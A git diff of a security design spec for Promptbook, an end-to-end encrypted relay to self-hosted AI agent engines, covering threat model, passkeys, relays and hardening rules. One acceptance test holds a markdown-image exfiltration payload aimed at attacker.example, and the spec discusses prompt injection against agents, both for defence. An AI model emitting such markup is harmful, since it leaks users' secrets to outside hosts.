@@ -1,5 +1,5 @@
 <!--
-Snapshot of the spec, rev 118 (2026-10-19). The living version is the Claude Doc:
+Snapshot of the spec, rev 121 (2026-10-19). The living version is the Claude Doc:
 https://claude.ai/code/artifact/cd422fa3-3ccb-4d1a-b7fe-79a10c32802b
 Decisions taken after this snapshot are recorded as ADRs in docs/adr.
 -->
@@ -30,15 +30,15 @@ Promptbook hosts a web interface where a user creates and controls agents that r
 
 **Attackers and what each one gets**
 
-| Attacker                                                                                               | Gets today without E2E   | Must get with this design                                                   |
-| ------------------------------------------------------------------------------------------------------ | ------------------------ | --------------------------------------------------------------------------- |
-| Promptbook operator or insider                                                                         | Everything on the server | Metadata only                                                               |
-| Compromised relay, hosting or CDN                                                                      | Traffic and stored data  | Metadata only                                                               |
-| Legal order to Promptbook                                                                              | Whatever we hold         | Metadata only; we have nothing else to hand over                            |
-| Malicious engine update, or a certificate mis-issued for an engine hostname (us, or a hijacked deploy) | n/a                      | **Detected**: see residual risks                                            |
-| Network attacker                                                                                       | Blocked by TLS           | Blocked by TLS and E2E                                                      |
-| Stolen user device                                                                                     | Full access              | That device's access, until it is revoked                                   |
-| Rogue agent or prompt injection on the engine                                                          | Engine access            | Engine access: out of scope for the channel; needs sandboxing on the engine |
+| Attacker | Gets today without E2E | Must get with this design |
+| --- | --- | --- |
+| Promptbook operator or insider | Everything on the server | Metadata only |
+| Compromised relay, hosting or CDN | Traffic and stored data | Metadata only |
+| Legal order to Promptbook | Whatever we hold | Metadata only; we have nothing else to hand over |
+| Malicious engine update, or a certificate mis-issued for an engine hostname (us, or a hijacked deploy) | n/a | **Detected**: see residual risks |
+| Network attacker | Blocked by TLS | Blocked by TLS and E2E |
+| Stolen user device | Full access | That device's access, until it is revoked |
+| Rogue agent or prompt injection on the engine | Engine access | Engine access: out of scope for the channel; needs sandboxing on the engine |
 
 **Trust assumptions we accept:** the user's own device and browser, the engine host, TLS 1.3, WebAuthn passkeys, the public CA and Certificate Transparency system, and the open-source code users can audit.
 
@@ -46,17 +46,17 @@ Promptbook hosts a web interface where a user creates and controls agents that r
 
 Our closest model is Home Assistant's Nabu Casa Remote UI: the cloud routes TLS by hostname without decrypting it, and the home instance serves its own UI. The other products below each contribute one pattern, or one mistake to avoid.
 
-| Product                                                                                                                                                                                 | How it works                                                                                                           | What we copy                                          | What we avoid                                                                                               |
-| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
-| [Nabu Casa Remote UI](https://github.com/NabuCasa/snitun)                                                                                                                               | Instance opens an outbound tunnel to SniTun; browser TLS ends on the instance; certificate via DNS-01                  | SNI passthrough; certificate and UI on the user's box | Vendor owns the DNS zone, so it could mis-issue a certificate (detectable only via CT)                      |
-| [Tailscale Funnel and Tailnet Lock](https://tailscale.com/kb/1226/tailnet-lock)                                                                                                         | TLS ends on the node for vendor-owned `*.ts.net` names; Tailnet Lock makes new nodes need signatures from user devices | User devices, not the vendor, authorise new members   | Recovery secrets users lose                                                                                 |
-| [Happy](https://github.com/slopus/happy) (Claude Code remote)                                                                                                                           | E2E app plus a relay; QR pairing with an ephemeral key; the server stores encrypted blobs                              | Same product shape; open-source, self-hostable relay  | Pairing not authenticated against the relay; RPC calls replayable; one shared secret; vendor-served web app |
-| [Claude Code Remote Control](https://code.claude.com/docs/en/remote-control)                                                                                                            | Outbound HTTPS; transcript on the vendor's servers                                                                     | Per-device trusted devices with biometric step-up     | Not E2E                                                                                                     |
-| [Chrome Remote Desktop](https://chromium.googlesource.com/chromium/src/+/098ef3d2d/remoting/protocol/spake2_authenticator.cc), [Magic Wormhole](https://magic-wormhole.readthedocs.io/) | Short code fed into SPAKE2; the relay sees only ciphertext                                                             | Short-code pairing as an option later                 | —                                                                                                           |
-| [Signal](https://signal.org/blog/a-synchronized-start-for-linked-devices/), [Keybase](https://keybase.io/docs/server_security)                                                          | Per-device keys; new devices linked from existing ones                                                                 | Per-device credentials that can be revoked one by one | Keybase kept crypto out of its served web UI, as we do                                                      |
-| [Syncthing](https://docs.syncthing.net/users/relaying.html), [StartOS](https://docs.start9.com/0.3.4.x/support/concepts/networks)                                                       | Device ID is a hash of its key; relays forward TLS; StartOS uses Tor onion addresses                                   | Engine ID derived from the engine key                 | —                                                                                                           |
-| [1Password](https://1password.com/files/1password-white-paper.pdf), Bitwarden, Proton                                                                                                   | Zero-knowledge web vaults, but the vendor serves the web client                                                        | Their honesty about the limit                         | Claiming zero trust while serving mutable JS                                                                |
-| Cloudflare Tunnel, ngrok, Omnara                                                                                                                                                        | The vendor terminates TLS or stores the content                                                                        | —                                                     | The anti-pattern for us                                                                                     |
+| Product | How it works | What we copy | What we avoid |
+| --- | --- | --- | --- |
+| [Nabu Casa Remote UI](https://github.com/NabuCasa/snitun) | Instance opens an outbound tunnel to SniTun; browser TLS ends on the instance; certificate via DNS-01 | SNI passthrough; certificate and UI on the user's box | Vendor owns the DNS zone, so it could mis-issue a certificate (detectable only via CT) |
+| [Tailscale Funnel and Tailnet Lock](https://tailscale.com/kb/1226/tailnet-lock) | TLS ends on the node for vendor-owned `*.ts.net` names; Tailnet Lock makes new nodes need signatures from user devices | User devices, not the vendor, authorise new members | Recovery secrets users lose |
+| [Happy](https://github.com/slopus/happy) (Claude Code remote) | E2E app plus a relay; QR pairing with an ephemeral key; the server stores encrypted blobs | Same product shape; open-source, self-hostable relay | Pairing not authenticated against the relay; RPC calls replayable; one shared secret; vendor-served web app |
+| [Claude Code Remote Control](https://code.claude.com/docs/en/remote-control) | Outbound HTTPS; transcript on the vendor's servers | Per-device trusted devices with biometric step-up | Not E2E |
+| [Chrome Remote Desktop](https://chromium.googlesource.com/chromium/src/+/098ef3d2d/remoting/protocol/spake2_authenticator.cc), [Magic Wormhole](https://magic-wormhole.readthedocs.io/) | Short code fed into SPAKE2; the relay sees only ciphertext | Short-code pairing as an option later | — |
+| [Signal](https://signal.org/blog/a-synchronized-start-for-linked-devices/), [Keybase](https://keybase.io/docs/server_security) | Per-device keys; new devices linked from existing ones | Per-device credentials that can be revoked one by one | Keybase kept crypto out of its served web UI, as we do |
+| [Syncthing](https://docs.syncthing.net/users/relaying.html), [StartOS](https://docs.start9.com/0.3.4.x/support/concepts/networks) | Device ID is a hash of its key; relays forward TLS; StartOS uses Tor onion addresses | Engine ID derived from the engine key | — |
+| [1Password](https://1password.com/files/1password-white-paper.pdf), Bitwarden, Proton | Zero-knowledge web vaults, but the vendor serves the web client | Their honesty about the limit | Claiming zero trust while serving mutable JS |
+| Cloudflare Tunnel, ngrok, Omnara | The vendor terminates TLS or stores the content | — | The anti-pattern for us |
 
 ## Architecture
 
@@ -143,13 +143,13 @@ The engine alone decides who may use it. People sign in to the engine with passk
 
 **Identities**
 
-| Identity                     | Created on                                | Held by                                                 | What it allows                                          |
-| ---------------------------- | ----------------------------------------- | ------------------------------------------------------- | ------------------------------------------------------- |
-| Engine key (Ed25519)         | Engine, at first start                    | Engine only                                             | Authenticates the tunnel to the relay; signs heartbeats |
-| TLS key and certificate      | Engine; certificate from Let's Encrypt    | Engine only                                             | Ends the browser's TLS on the engine                    |
-| Owner and member passkeys    | User's device, registered with the engine | Device or passkey manager; engine keeps the public key  | Signing in to the engine UI                             |
-| Owner setup secret (128-bit) | Engine                                    | Shown once in the engine's terminal, single use, 30 min | Registering the first passkey                           |
-| Promptbook account           | Our dashboard                             | Us                                                      | Billing, engine list, status. No access to the engine   |
+| Identity | Created on | Held by | What it allows |
+| --- | --- | --- | --- |
+| Engine key (Ed25519) | Engine, at first start | Engine only | Authenticates the tunnel to the relay; signs heartbeats |
+| TLS key and certificate | Engine; certificate from Let's Encrypt | Engine only | Ends the browser's TLS on the engine |
+| Owner and member passkeys | User's device, registered with the engine | Device or passkey manager; engine keeps the public key | Signing in to the engine UI |
+| Owner setup secret (128-bit) | Engine | Shown once in the engine's terminal, single use, 30 min | Registering the first passkey |
+| Promptbook account | Our dashboard | Us | Billing, engine list, status. No access to the engine |
 
 **First setup (v0)**
 
@@ -171,13 +171,13 @@ We never see the setup secret, so we cannot claim the owner seat. Only someone w
 
 A passkey needs no fingerprint reader. Almost every computer can use one through one of the first four routes below. The fifth covers the rare device with none of them, and we deliberately offer no password fallback, because passwords can be phished.
 
-| Route                                           | Works on                                                                                                     | Notes                                                                                                                                                                                                                                                    |
-| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Windows Hello with a PIN                        | Most Windows 10 and 11 PCs, no camera or fingerprint needed                                                  | The default prompt on Windows                                                                                                                                                                                                                            |
-| Passkey stored in a browser or password manager | Any OS with Chrome (Google Password Manager), 1Password, Bitwarden, Proton Pass or Dashlane, including Linux | Synced, so it also covers the user's other devices                                                                                                                                                                                                       |
-| Phone as the authenticator                      | Any computer with Bluetooth and a modern browser; phone on iOS 16+ or Android 9+                             | The browser shows a QR code and the phone confirms over Bluetooth proximity, which resists phishing                                                                                                                                                      |
-| Hardware security key (e.g. YubiKey)            | Any computer with USB or NFC                                                                                 | Recommended for owners and company accounts; register two                                                                                                                                                                                                |
-| Device approved by a signed-in device           | Anything with a modern browser                                                                               | The new browser creates a non-extractable key in WebCrypto, and the owner approves it from a signed-in device, as in Bitwarden's login with device. It is weaker than a passkey because it is not hardware-backed, so it gets a shorter session lifetime |
+| Route | Works on | Notes |
+| --- | --- | --- |
+| Windows Hello with a PIN | Most Windows 10 and 11 PCs, no camera or fingerprint needed | The default prompt on Windows |
+| Passkey stored in a browser or password manager | Any OS with Chrome (Google Password Manager), 1Password, Bitwarden, Proton Pass or Dashlane, including Linux | Synced, so it also covers the user's other devices |
+| Phone as the authenticator | Any computer with Bluetooth and a modern browser; phone on iOS 16+ or Android 9+ | The browser shows a QR code and the phone confirms over Bluetooth proximity, which resists phishing |
+| Hardware security key (e.g. YubiKey) | Any computer with USB or NFC | Recommended for owners and company accounts; register two |
+| Device approved by a signed-in device | Anything with a modern browser | The new browser creates a non-extractable key in WebCrypto, and the owner approves it from a signed-in device, as in Bitwarden's login with device. It is weaker than a passkey because it is not hardware-backed, so it gets a shorter session lifetime |
 
 Companies can later restrict which kinds are allowed (for example, hardware keys only) through WebAuthn attestation policies, or hand sign-in to their identity provider through SSO.
 
@@ -187,12 +187,12 @@ The engine dials out to our relay on port 443 and holds a multiplexed tunnel ope
 
 **Why a relay is needed:** we want one address, nothing opened on the engine host, and no code served by us. For an engine without a public address, something it dialled out to must forward the traffic. Every alternative breaks one of those three:
 
-| Alternative                     | What it breaks                                                                   |
-| ------------------------------- | -------------------------------------------------------------------------------- |
-| Direct connection to the engine | Needs a public IP, an open port and certificate handling on the customer's side  |
-| WebRTC peer-to-peer             | We would serve the frontend; corporate networks still need a TURN relay          |
-| Cloudflare Tunnel, ngrok        | They decrypt the traffic                                                         |
-| Tailscale or another VPN        | Every user device needs a client; Tailscale itself falls back to its DERP relays |
+| Alternative | What it breaks |
+| --- | --- |
+| Direct connection to the engine | Needs a public IP, an open port and certificate handling on the customer's side |
+| WebRTC peer-to-peer | We would serve the frontend; corporate networks still need a TURN relay |
+| Cloudflare Tunnel, ngrok | They decrypt the traffic |
+| Tailscale or another VPN | Every user device needs a client; Tailscale itself falls back to its DERP relays |
 
 The relay never decrypts, so it is not a trust point. It must not be a single point of failure either (see below).
 
@@ -203,21 +203,21 @@ The relay never decrypts, so it is not a trust point. It must not be a single po
 
 **Implementation options**
 
-| Option                                                           | Notes                                                                            | Use                                          |
-| ---------------------------------------------------------------- | -------------------------------------------------------------------------------- | -------------------------------------------- |
-| [SniTun](https://github.com/NabuCasa/snitun) (Nabu Casa, Python) | Built for exactly this and proven at Home Assistant's scale                      | Study the design; licence check before reuse |
-| frp (Go), `https` vhost                                          | Popular reverse proxy that routes by SNI; passthrough behaviour to verify        | 1–2 day spike                                |
-| Own relay (TypeScript on Node)                                   | SNI peek plus stream multiplexing (yamux or HTTP/2). Small enough to audit fully | Recommended for production                   |
+| Option | Notes | Use |
+| --- | --- | --- |
+| [SniTun](https://github.com/NabuCasa/snitun) (Nabu Casa, Python) | Built for exactly this and proven at Home Assistant's scale | Study the design; licence check before reuse |
+| frp (Go), `https` vhost | Popular reverse proxy that routes by SNI; passthrough behaviour to verify | 1–2 day spike |
+| Own relay (TypeScript on Node) | SNI peek plus stream multiplexing (yamux or HTTP/2). Small enough to audit fully | Recommended for production |
 
 **Hosting:** the relay needs raw TCP on 443, which Cloudflare Workers cannot accept; Cloudflare Spectrum can, but only on Enterprise plans. Relays therefore run on plain VPSs. Because a relay only sees ciphertext, the provider affects availability and metadata, not confidentiality.
 
 **No single point of failure:** a relay holds no secrets and almost no state, so anyone can run one without being trusted.
 
-| Stage | Who runs relays                                                                                                                 | Failover                                                                                                          |
-| ----- | ------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
-| v0    | Us. The engine takes a list of N relays from day one; we start on one VPS and add a second before the paid launch (recommended) | Each engine holds a tunnel to every relay in its list; DNS returns all of them and the browser tries the next one |
-| v1    | Us, 2–3 providers in different countries (e.g. Hetzner, OVH, Fly.io)                                                            | Each engine tunnels to relays at 2 providers, so one provider's outage goes unnoticed                             |
-| Later | Federation: partners and companies run relays from a signed relay list                                                          | A company can use its own relay with ours as backup; DNS lists the relays each engine is connected to             |
+| Stage | Who runs relays | Failover |
+| --- | --- | --- |
+| v0 | Us. The engine takes a list of N relays from day one; we start on one VPS and add a second before the paid launch (recommended) | Each engine holds a tunnel to every relay in its list; DNS returns all of them and the browser tries the next one |
+| v1 | Us, 2–3 providers in different countries (e.g. Hetzner, OVH, Fly.io) | Each engine tunnels to relays at 2 providers, so one provider's outage goes unnoticed |
+| Later | Federation: partners and companies run relays from a signed relay list | A company can use its own relay with ours as backup; DNS lists the relays each engine is connected to |
 
 Engines relaying traffic for each other is rejected: customer servers would carry strangers' traffic, which brings legal, abuse and reliability problems. A Tor onion address can be an optional extra for enthusiasts, as StartOS offers.
 
@@ -233,13 +233,13 @@ Our platform has no command channel into the engine. The limited API from the or
 
 **Heartbeat (engine to platform, every 60 s, signed by the engine key)**
 
-| Field                       | Type              | Why we need it              |
-| --------------------------- | ----------------- | --------------------------- |
-| Engine ID, engine version   | ID, semver        | Engine list, update status  |
-| Online, uptime              | bool, seconds     | Status page, offline alerts |
-| Disk, RAM, CPU load         | percent, bucketed | Health alerts               |
-| Update available or pending | enum              | Status page                 |
-| Agent count, member count   | integer           | Billing by agent count      |
+| Field | Type | Why we need it |
+| --- | --- | --- |
+| Engine ID, engine version | ID, semver | Engine list, update status |
+| Online, uptime | bool, seconds | Status page, offline alerts |
+| Disk, RAM, CPU load | percent, bucketed | Health alerts |
+| Update available or pending | enum | Status page |
+| Agent count, member count | integer | Billing by agent count |
 
 The heartbeat carries no names, prompts, free text or error messages. The engine enforces the schema in open-source code, and the engine UI shows the owner the exact last payload sent. The schema is public and versioned, and any new field ships in the release notes. Agent count and availability are decided; further aggregated statistics stay open and are added only for a real product need.
 
@@ -257,14 +257,14 @@ The heartbeat carries no names, prompts, free text or error messages. The engine
 
 We see who pays, which engines exist, whether they are healthy, and how much traffic flows. We do not see what flows. Every item below should be in the public privacy policy, with its retention period.
 
-| Data                                                     | Source                            | Needed for              | Proposed retention                           |
-| -------------------------------------------------------- | --------------------------------- | ----------------------- | -------------------------------------------- |
-| Account email, billing details                           | Signup, Stripe                    | Account, invoices       | While the account exists, plus legal minimum |
-| Engine ID, hostname, engine public key                   | Registration                      | Routing                 | While the engine exists                      |
-| Heartbeat values                                         | Engine                            | Status, alerts, billing | 30 days                                      |
-| Engine IP, tunnel connect and disconnect times           | Relay                             | Operations, abuse       | 7 days                                       |
-| Browser IPs, connection times and byte counts per engine | Relay                             | Abuse handling only     | 24 h, not linked to accounts                 |
-| SNI hostname                                             | Relay (and the network until ECH) | Routing                 | Not stored                                   |
+| Data | Source | Needed for | Proposed retention |
+| --- | --- | --- | --- |
+| Account email, billing details | Signup, Stripe | Account, invoices | While the account exists, plus legal minimum |
+| Engine ID, hostname, engine public key | Registration | Routing | While the engine exists |
+| Heartbeat values | Engine | Status, alerts, billing | 30 days |
+| Engine IP, tunnel connect and disconnect times | Relay | Operations, abuse | 7 days |
+| Browser IPs, connection times and byte counts per engine | Relay | Abuse handling only | 24 h, not linked to accounts |
+| SNI hostname | Relay (and the network until ECH) | Routing | Not stored |
 
 **Minimisation:** the relay keeps no access logs by default. Byte counts are aggregated per day. The hostname uses a key-derived ID, not the user's or company's name. TLS record sizes and timing stay visible; padding is out of scope for v0.
 
@@ -294,17 +294,17 @@ The engine API is a typed HTTP API (Hono recommended; see Hosting and stack). Ev
 
 **Baseline rules**
 
-| Area               | Rule                                                                                                                                                                              |
-| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| API                | Every input validated by a schema (zod or valibot); deny-by-default authorisation checked per route against one policy module                                                     |
-| Sessions           | Passkeys only; `__Host-` cookies, `Secure`, `HttpOnly`, `SameSite=Strict`; short TTL; fresh passkey assertion for sensitive actions; Origin check on every state-changing request |
-| Browser headers    | CSP `script-src 'self'` with no `unsafe-inline` or `unsafe-eval`, Trusted Types, `frame-ancestors 'none'`, HSTS, COOP, `Referrer-Policy: no-referrer`                             |
-| Secrets            | Encrypted at rest with envelope encryption; key in a 0600 file or the OS keyring; write-only in the UI                                                                            |
-| Process separation | Engine key and TLS key readable only by the tunnel/TLS process; agents run as separate Unix users with no access to the engine database or keys                                   |
-| Agent sandbox      | Each agent in a rootless container (later gVisor or Firecracker); network only through the engine's egress proxy (see Security hardening)                                         |
-| Supply chain       | pnpm with a locked lockfile, a minimum release age for new versions, and install scripts disabled except an allowlist; SBOM (CycloneDX) per release; Renovate; OpenSSF Scorecard  |
-| Verification       | CodeQL or Semgrep in CI, schema fuzzing of the API, a pentest before general availability, then a bug bounty                                                                      |
-| Audit              | Append-only, hash-chained audit log of every authenticated action, visible in the security panel                                                                                  |
+| Area | Rule |
+| --- | --- |
+| API | Every input validated by a schema (zod or valibot); deny-by-default authorisation checked per route against one policy module |
+| Sessions | Passkeys only; `__Host-` cookies, `Secure`, `HttpOnly`, `SameSite=Strict`; short TTL; fresh passkey assertion for sensitive actions; Origin check on every state-changing request |
+| Browser headers | CSP `script-src 'self'` with no `unsafe-inline` or `unsafe-eval`, Trusted Types, `frame-ancestors 'none'`, HSTS, COOP, `Referrer-Policy: no-referrer` |
+| Secrets | Encrypted at rest with envelope encryption; key in a 0600 file or the OS keyring; write-only in the UI |
+| Process separation | Engine key and TLS key readable only by the tunnel/TLS process; agents run as separate Unix users with no access to the engine database or keys |
+| Agent sandbox | Each agent in a rootless container (later gVisor or Firecracker); network only through the engine's egress proxy (see Security hardening) |
+| Supply chain | pnpm with a locked lockfile, a minimum release age for new versions, and install scripts disabled except an allowlist; SBOM (CycloneDX) per release; Renovate; OpenSSF Scorecard |
+| Verification | CodeQL or Semgrep in CI, schema fuzzing of the API, a pentest before general availability, then a bug bounty |
+| Audit | Append-only, hash-chained audit log of every authenticated action, visible in the security panel |
 
 ## Security hardening
 
@@ -322,23 +322,23 @@ Ten structural measures carry the engine's security. Each closes a whole class o
 
 This turns "minimal public face" from a policy into a property of the architecture, and makes bugs like CVE-2025-29927 unreachable without a session. Done when: an anonymous scan of an engine reaches only the sign-in and setup pages and the agents marked public.
 
-**2. Agents never run as root and never sit next to engine secrets.** Agents are Claude Code, Codex and similar CLIs with a shell, so whatever they can reach, a prompt injection can reach. They run in a separate runner container, each agent as its own unprivileged user with its own workspace. The runner has no engine environment, database, keys or other agents' files. Coding CLIs reach their LLM through an engine-run gateway with a per-agent, revocable, budget-limited token, so real provider keys never enter the runner. Public agents run with no credentials and no logged-in browser profiles. _Done when:_ inside an agent, `env`, the filesystem and the process list show no engine secret and no other agent's data.
+**2. Agents never run as root and never sit next to engine secrets.** Agents are Claude Code, Codex and similar CLIs with a shell, so whatever they can reach, a prompt injection can reach. They run in a separate runner container, each agent as its own unprivileged user with its own workspace. The runner has no engine environment, database, keys or other agents' files. Coding CLIs reach their LLM through an engine-run gateway with a per-agent, revocable, budget-limited token, so real provider keys never enter the runner. Public agents run with no credentials and no logged-in browser profiles. *Done when:* inside an agent, `env`, the filesystem and the process list show no engine secret and no other agent's data.
 
-**3. One way out: the egress proxy.** The runner's only network route is the engine's egress proxy, and every server-side fetch in the engine uses the same guard. It resolves each name, connects only to the address it checked, re-checks every redirect, and blocks private, loopback, link-local, CGNAT and IPv6 ULA ranges, including cloud metadata (`169.254.169.254`, `fd00:ec2::254`). The public internet stays open by default; per-agent allowlists are an option, not a requirement. _Done when:_ requests from an agent to the metadata address, the LAN and the engine's own ports fail, including through a redirect.
+**3. One way out: the egress proxy.** The runner's only network route is the engine's egress proxy, and every server-side fetch in the engine uses the same guard. It resolves each name, connects only to the address it checked, re-checks every redirect, and blocks private, loopback, link-local, CGNAT and IPv6 ULA ranges, including cloud metadata (`169.254.169.254`, `fd00:ec2::254`). The public internet stays open by default; per-agent allowlists are an option, not a requirement. *Done when:* requests from an agent to the metadata address, the LAN and the engine's own ports fail, including through a redirect.
 
-**4. Nothing leaves the engine unless it is on the list.** The engine itself may contact only the relays, the heartbeat endpoint, the release log, the LLM providers the owner configured, and services the owner adds. No telemetry or error-reporting DSN ships by default, SDK tracing is off (for example OpenAI Agents tracing), and every UI asset, font and map tile is served by the engine. The security panel lists every outbound destination. _Done when:_ a packet capture of a fresh engine through a full chat session shows only listed destinations.
+**4. Nothing leaves the engine unless it is on the list.** The engine itself may contact only the relays, the heartbeat endpoint, the release log, the LLM providers the owner configured, and services the owner adds. No telemetry or error-reporting DSN ships by default, SDK tracing is off (for example OpenAI Agents tracing), and every UI asset, font and map tile is served by the engine. The security panel lists every outbound destination. *Done when:* a packet capture of a fresh engine through a full chat session shows only listed destinations.
 
-**5. Agent output is untrusted in the browser.** The UI sends a strict CSP: `default-src 'self'`, `img-src 'self' data:`, `connect-src 'self'`, no `unsafe-inline` or `unsafe-eval`, Trusted Types, `frame-ancestors 'none'`. Markdown from agents is sanitised after the stream ends, external images are shown as links rather than loaded, and agent output can never become an executable button or script. _Done when:_ an agent reply containing `![x](https://attacker.example/?d=secret)` causes no network request.
+**5. Agent output is untrusted in the browser.** The UI sends a strict CSP: `default-src 'self'`, `img-src 'self' data:`, `connect-src 'self'`, no `unsafe-inline` or `unsafe-eval`, Trusted Types, `frame-ancestors 'none'`. Markdown from agents is sanitised after the stream ends, external images are shown as links rather than loaded, and agent output can never become an executable button or script. *Done when:* an agent reply containing `![x](https://attacker.example/?d=secret)` causes no network request.
 
-**6. Tool calls never become code.** No `eval`, `new Function` or `vm` anywhere in the engine, enforced by a lint rule. Tool names are resolved through a server-side allowlist, and arguments are validated against a strict JSON schema; invalid calls are rejected, not repaired. _Done when:_ the lint rule is a required CI check.
+**6. Tool calls never become code.** No `eval`, `new Function` or `vm` anywhere in the engine, enforced by a lint rule. Tool names are resolved through a server-side allowlist, and arguments are validated against a strict JSON schema; invalid calls are rejected, not repaired. *Done when:* the lint rule is a required CI check.
 
-**7. Deny by default, owner-scoped data.** Every API resource is authorised in one policy module against its owner, never in scattered checks. Secrets, API tokens, OAuth tokens and browser profiles are encrypted at rest per owner and agent and never returned by any endpoint. The owner sees each secret's name, scope and last use, and can replace, revoke or delete it, but cannot read the value back, so a stolen session cannot steal credentials. _Done when:_ an automated test signs in as user B and gets 403 on every one of user A's resources.
+**7. Deny by default, owner-scoped data.** Every API resource is authorised in one policy module against its owner, never in scattered checks. Secrets, API tokens, OAuth tokens and browser profiles are encrypted at rest per owner and agent and never returned by any endpoint. The owner sees each secret's name, scope and last use, and can replace, revoke or delete it, but cannot read the value back, so a stolen session cannot steal credentials. *Done when:* an automated test signs in as user B and gets 403 on every one of user A's resources.
 
-**8. Server-side sessions and cross-site protection.** Sessions live on the engine: 128-bit IDs, `__Host-` cookies with `Secure`, `HttpOnly` and `SameSite=Strict`, idle and absolute timeouts, a new ID on sign-in, and revocation of one or all sessions. The gateway rejects cross-site requests using Fetch Metadata (`Sec-Fetch-Site`) before any other code runs. API tokens are stored hashed, scoped and expiring. _Done when:_ a revoked session fails within one request, and a cross-site POST gets 403 at the gateway.
+**8. Server-side sessions and cross-site protection.** Sessions live on the engine: 128-bit IDs, `__Host-` cookies with `Secure`, `HttpOnly` and `SameSite=Strict`, idle and absolute timeouts, a new ID on sign-in, and revocation of one or all sessions. The gateway rejects cross-site requests using Fetch Metadata (`Sec-Fetch-Site`) before any other code runs. API tokens are stored hashed, scoped and expiring. *Done when:* a revoked session fails within one request, and a cross-site POST gets 403 at the gateway.
 
-**9. The engine cannot change its own code.** The engine container runs as non-root with a read-only root filesystem, all capabilities dropped, `no-new-privileges` and no Docker socket. Updates are applied by a small separate updater, the only component allowed to restart containers, which accepts only logged releases signed both by our release workflow identity and by the release key; the update source cannot be changed from the UI or an API. _Done when:_ the engine process cannot write its own code directory, and the updater refuses an unsigned image and a downgrade.
+**9. The engine cannot change its own code.** The engine container runs as non-root with a read-only root filesystem, all capabilities dropped, `no-new-privileges` and no Docker socket. Updates are applied by a small separate updater, the only component allowed to restart containers, which accepts only logged releases signed both by our release workflow identity and by the release key; the update source cannot be changed from the UI or an API. *Done when:* the engine process cannot write its own code directory, and the updater refuses an unsigned image and a downgrade.
 
-**10. A release pipeline that one stolen token cannot poison.** Release jobs run on GitHub-hosted runners with SHA-pinned actions, read-only default tokens, no `pull_request_target` workflows and no restored caches. Publishing uses npm trusted publishing with a human approval step, and images are signed keylessly with cosign. Engines also require the release key's signature, made by a person on a hardware key, so a compromised pipeline alone cannot ship. Dependencies are locked, install scripts are allowlisted, and new versions wait at least 24 hours. This is the path used in the TanStack npm compromise of May 2026. _Done when:_ a release cannot be published without a second maintainer's approval.
+**10. A release pipeline that one stolen token cannot poison.** Release jobs run on GitHub-hosted runners with SHA-pinned actions, read-only default tokens, no `pull_request_target` workflows and no restored caches. Publishing uses npm trusted publishing with a human approval step, and images are signed keylessly with cosign. Engines also require the release key's signature, made by a person on a hardware key, so a compromised pipeline alone cannot ship. Dependencies are locked, install scripts are allowlisted, and new versions wait at least 24 hours. This is the path used in the TanStack npm compromise of May 2026. *Done when:* a release cannot be published without a second maintainer's approval.
 
 **CI security gates:** the checks above run on every release as one suite: an anonymous scan of a test engine, the egress tests from inside an agent, the packet capture, the CSP exfiltration test, the cross-user authorisation test, the no-`eval` lint and the updater signature test. A failing check blocks the release.
 
@@ -348,17 +348,17 @@ This turns "minimal public face" from a policy into a property of the architectu
 
 Enterprise features must fit later without breaking the zero-trust model. The rule that keeps this true: every enterprise feature runs on the engine or between the customer's own systems, and our platform at most relays signed blobs it cannot forge.
 
-| Capability    | Build now (v0)                                                                              | Add later                                                                                                                       |
-| ------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
-| Data model    | Org, team, project and agent entities; every row carries an org ID, even for a single owner | Multiple orgs per engine if ever needed                                                                                         |
-| Identity      | Auth as a pluggable module; passkeys                                                        | OIDC and SAML SSO with the customer's IdP talking directly to the engine; SCIM provisioning                                     |
-| Authorisation | Roles (owner, admin, member, viewer) checked in one policy module                           | Attribute-based policies with a policy engine such as [Cedar](https://www.cedarpolicy.com/)                                     |
-| Audit         | Hash-chained local audit log                                                                | Export to the customer's SIEM (syslog, OpenTelemetry, webhook)                                                                  |
-| API           | Versioned `/v1` API with an OpenAPI contract                                                | Public SDK, CLI, mobile app                                                                                                     |
-| Fleets        | Engine ID and org ID in the heartbeat                                                       | Fleet policies (allowed models, egress rules, update ring) signed by an org admin key; we distribute them but cannot forge them |
-| Updates       | Signed, logged releases; version pinning                                                    | Update rings (canary, stable) per fleet                                                                                         |
-| Extensions    | Capability manifest for agents                                                              | Plugins under the same manifest and sandbox                                                                                     |
-| Backups       | Encrypted backups to the customer's own storage (v0, see Operations)                        | Scheduled restore tests, retention policies, backup status in the security panel                                                |
+| Capability | Build now (v0) | Add later |
+| --- | --- | --- |
+| Data model | Org, team, project and agent entities; every row carries an org ID, even for a single owner | Multiple orgs per engine if ever needed |
+| Identity | Auth as a pluggable module; passkeys | OIDC and SAML SSO with the customer's IdP talking directly to the engine; SCIM provisioning |
+| Authorisation | Roles (owner, admin, member, viewer) checked in one policy module | Attribute-based policies with a policy engine such as [Cedar](https://www.cedarpolicy.com/) |
+| Audit | Hash-chained local audit log | Export to the customer's SIEM (syslog, OpenTelemetry, webhook) |
+| API | Versioned `/v1` API with an OpenAPI contract | Public SDK, CLI, mobile app |
+| Fleets | Engine ID and org ID in the heartbeat | Fleet policies (allowed models, egress rules, update ring) signed by an org admin key; we distribute them but cannot forge them |
+| Updates | Signed, logged releases; version pinning | Update rings (canary, stable) per fleet |
+| Extensions | Capability manifest for agents | Plugins under the same manifest and sandbox |
+| Backups | Encrypted backups to the customer's own storage (v0, see Operations) | Scheduled restore tests, retention policies, backup status in the security panel |
 
 Data residency comes for free: the data never leaves the customer's server. For our own platform (relay, dashboard, billing), plan for SOC 2 or ISO 27001 once enterprise sales start.
 
@@ -386,30 +386,31 @@ The whole stack can be TypeScript, and everything runs on Cloudflare except the 
 
 **Hosting**
 
-| Part              | Where                                                                                                                                            | Why                                                                                                                   |
-| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
-| Relay             | One VPS to start (e.g. Hetzner, EU), a second before the paid launch, then other providers (e.g. OVH, Fly.io) and independent operators          | Needs raw TCP on 443 and long-lived connections, so not Workers. EU suits GDPR.                                       |
